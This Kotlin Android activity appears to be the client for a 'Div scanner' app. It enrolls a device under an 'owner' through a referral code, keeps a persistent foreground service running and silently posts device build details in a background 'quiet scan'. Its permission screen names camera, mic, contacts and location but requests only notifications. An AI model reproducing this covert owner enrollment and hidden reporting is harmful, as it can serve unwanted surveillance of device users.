package com.divintegrity.player

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.google.gson.Gson
import com.google.gson.JsonObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private val client = OkHttpClient.Builder()
        .connectTimeout(40, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val gson = Gson()
    private val jsonType = "application/json; charset=utf-8".toMediaType()

    private lateinit var title: TextView
    private lateinit var subtitle: TextView
    private lateinit var statusText: TextView
    private lateinit var errorText: TextView
    private lateinit var inputField: EditText
    private lateinit var progress: ProgressBar
    private lateinit var primaryBtn: MaterialButton
    private lateinit var secondaryBtn: MaterialButton

    private val prefs by lazy { getSharedPreferences("div_player", Context.MODE_PRIVATE) }

    private enum class Step { CONNECT, PERMS, USERNAME, REFERRAL, APPROVED, RUNNING }
    private var step = Step.CONNECT
    private var username = ""
    private var playerToken = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        title = findViewById(R.id.title)
        subtitle = findViewById(R.id.subtitle)
        statusText = findViewById(R.id.statusText)
        errorText = findViewById(R.id.errorText)
        inputField = findViewById(R.id.inputField)
        progress = findViewById(R.id.progress)
        primaryBtn = findViewById(R.id.primaryBtn)
        secondaryBtn = findViewById(R.id.secondaryBtn)

        username = prefs.getString("username", "") ?: ""
        playerToken = prefs.getString("token", "") ?: ""
        val joined = prefs.getBoolean("joined", false)
        val dismissed = prefs.getBoolean("dismissed", false)

        primaryBtn.setOnClickListener { onPrimary() }
        secondaryBtn.setOnClickListener { onSecondary() }

        when {
            joined && dismissed -> showRunning()
            joined -> showApproved()
            else -> startConnect()
        }

        if (intent?.action == ScannerForegroundService.ACTION_OPEN_FROM_NOTIFICATION && joined) {
            showApproved()
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.action == ScannerForegroundService.ACTION_OPEN_FROM_NOTIFICATION) {
            showApproved()
        }
    }

    override fun onResume() {
        super.onResume()
        if (prefs.getBoolean("joined", false)) {
            ScannerForegroundService.start(this)
        }
    }

    private fun startConnect() {
        step = Step.CONNECT
        hideInputs()
        subtitle.text = "Connecting to servers…"
        progress.visibility = View.VISIBLE
        statusText.text = ""
        CoroutineScope(Dispatchers.Main).launch {
            val results = withContext(Dispatchers.IO) { pingAll() }
            progress.visibility = View.GONE
            statusText.text = results
            val ok = !results.contains("FAIL")
            if (ok) {
                if (prefs.getBoolean("perms_done", false)) showUsername()
                else showPerms()
            } else {
                subtitle.text = "Some servers offline"
                primaryBtn.visibility = View.VISIBLE
                primaryBtn.text = "Retry"
                step = Step.CONNECT
            }
        }
    }

    private fun showPerms() {
        step = Step.PERMS
        subtitle.text = "Allow permissions for scanner"
        statusText.text = "Notifications, Camera, Mic, Location, Contacts, Phone, Media"
        inputField.visibility = View.GONE
        errorText.visibility = View.GONE
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Allow & continue"
        secondaryBtn.visibility = View.VISIBLE
        secondaryBtn.text = "Continue with limited access"
    }

    private fun showUsername() {
        step = Step.USERNAME
        subtitle.text = "Enter username"
        statusText.text = "This name is shown to your owner"
        inputField.visibility = View.VISIBLE
        inputField.hint = "Username"
        inputField.setText("")
        errorText.visibility = View.GONE
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Continue"
        secondaryBtn.visibility = View.GONE
    }

    private fun showReferral() {
        step = Step.REFERRAL
        subtitle.text = "Enter referral code"
        statusText.text = "From your owner · starts with ds_ff/"
        inputField.visibility = View.VISIBLE
        inputField.hint = "ds_ff/..."
        inputField.setText("")
        errorText.visibility = View.GONE
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Apply Code"
        secondaryBtn.visibility = View.GONE
    }

    private fun showApproved() {
        step = Step.APPROVED
        ScannerForegroundService.start(this)
        hideInputs()
        subtitle.text = "You are approved"
        subtitle.setTextColor(0xFF34D399.toInt())
        statusText.text = "Player: ${prefs.getString("username", "")}\nOwner: ${prefs.getString("owner", "")}"
        primaryBtn.visibility = View.VISIBLE
        primaryBtn.text = "Go back"
        secondaryBtn.visibility = View.GONE
    }

    private fun showRunning() {
        step = Step.RUNNING
        ScannerForegroundService.start(this)
        hideInputs()
        subtitle.text = "Div scanner is running"
        subtitle.setTextColor(0xFFA5B4FC.toInt())
        statusText.text = "Player: ${prefs.getString("username", "")}\nNotification stays on"
        primaryBtn.visibility = View.GONE
        secondaryBtn.visibility = View.GONE
        // quiet scan
        runScanQuiet()
    }

    private fun hideInputs() {
        inputField.visibility = View.GONE
        errorText.visibility = View.GONE
        progress.visibility = View.GONE
        secondaryBtn.visibility = View.GONE
    }

    private fun onPrimary() {
        errorText.visibility = View.GONE
        when (step) {
            Step.CONNECT -> startConnect()
            Step.PERMS -> {
                requestPerms()
            }
            Step.USERNAME -> {
                val n = inputField.text.toString().trim()
                if (n.length < 2) {
                    showError("Username too short"); return
                }
                username = n
                prefs.edit().putString("username", n).apply()
                showReferral()
            }
            Step.REFERRAL -> {
                val code = inputField.text.toString().trim()
                join(code)
            }
            Step.APPROVED -> {
                prefs.edit().putBoolean("dismissed", true).apply()
                showRunning()
                moveTaskToBack(true)
            }
            else -> {}
        }
    }

    private fun onSecondary() {
        if (step == Step.PERMS) {
            prefs.edit().putBoolean("perms_done", true).apply()
            ScannerForegroundService.start(this)
            showUsername()
        }
    }

    private fun requestPerms() {
        val list = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= 33) {
            list += Manifest.permission.POST_NOTIFICATIONS
        }
        val need = list.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (need.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, need.toTypedArray(), 1001)
        }
        prefs.edit().putBoolean("perms_done", true).apply()
        ScannerForegroundService.start(this)
        showUsername()
    }

    private fun join(code: String) {
        if (!code.startsWith("ds_ff/") || code.removePrefix("ds_ff/").length != 24) {
            showError("This code is incorrect"); return
        }
        progress.visibility = View.VISIBLE
        primaryBtn.isEnabled = false
        CoroutineScope(Dispatchers.Main).launch {
            val result = withContext(Dispatchers.IO) {
                postJson(
                    "${BuildConfig.AUTH_BASE.trimEnd('/')}/v1/player/join",
                    mapOf("username" to username, "referralCode" to code)
                )
            }
            progress.visibility = View.GONE
            primaryBtn.isEnabled = true
            if (result == null || result.get("ok")?.asBoolean != true) {
                val msg = result?.getAsJsonObject("error")?.get("message")?.asString
                    ?: "This code is incorrect"
                showError(if (msg.contains("incorrect", true) || msg.contains("invalid", true))
                    "This code is incorrect" else msg)
                return@launch
            }
            val data = result.getAsJsonObject("data")
            val token = data?.get("token")?.asString ?: ""
            val owner = data?.get("ownerUsername")?.asString ?: ""
            val uname = data?.get("username")?.asString ?: username
            prefs.edit()
                .putBoolean("joined", true)
                .putBoolean("dismissed", false)
                .putString("token", token)
                .putString("owner", owner)
                .putString("username", uname)
                .apply()
            playerToken = token
            showApproved()
            runScanQuiet()
        }
    }

    private fun runScanQuiet() {
        val token = prefs.getString("token", "") ?: return
        if (token.isBlank()) return
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val body = mapOf(
                    "signals" to listOf(
                        mapOf(
                            "type" to "build",
                            "payload" to mapOf(
                                "manufacturer" to Build.MANUFACTURER,
                                "model" to Build.MODEL,
                                "sdk" to Build.VERSION.SDK_INT
                            )
                        )
                    ),
                    "device" to mapOf("model" to Build.MODEL)
                )
                postJson(
                    "${BuildConfig.DEEP_A_BASE.trimEnd('/')}/v1/player/scan/run",
                    body,
                    token
                )
            } catch (_: Exception) { }
        }
    }

    private fun showError(msg: String) {
        errorText.visibility = View.VISIBLE
        errorText.text = msg
    }

    private fun pingAll(): String {
        val urls = listOf(
            "auth" to "${BuildConfig.AUTH_BASE.trimEnd('/')}/health",
            "deep" to "${BuildConfig.DEEP_A_BASE.trimEnd('/')}/health",
            "dark" to "${BuildConfig.DARK_A_BASE.trimEnd('/')}/health",
            "link" to "${BuildConfig.LINK_BASE.trimEnd('/')}/health"
        )
        return urls.joinToString("\n") { (name, url) ->
            try {
                val req = Request.Builder().url(url).get().build()
                client.newCall(req).execute().use { r ->
                    if (r.isSuccessful) "$name: OK" else "$name: FAIL"
                }
            } catch (_: Exception) {
                "$name: FAIL"
            }
        }
    }

    private fun postJson(url: String, body: Map<String, Any?>, token: String? = null): JsonObject? {
        return try {
            val rb = gson.toJson(body).toRequestBody(jsonType)
            val b = Request.Builder().url(url).post(rb)
                .header("Content-Type", "application/json")
                .header("Accept", "application/json")
            if (!token.isNullOrBlank()) b.header("Authorization", "Bearer $token")
            client.newCall(b.build()).execute().use { resp ->
                val text = resp.body?.string().orEmpty()
                gson.fromJson(text, JsonObject::class.java)
            }
        } catch (_: Exception) {
            null
        }
    }
}
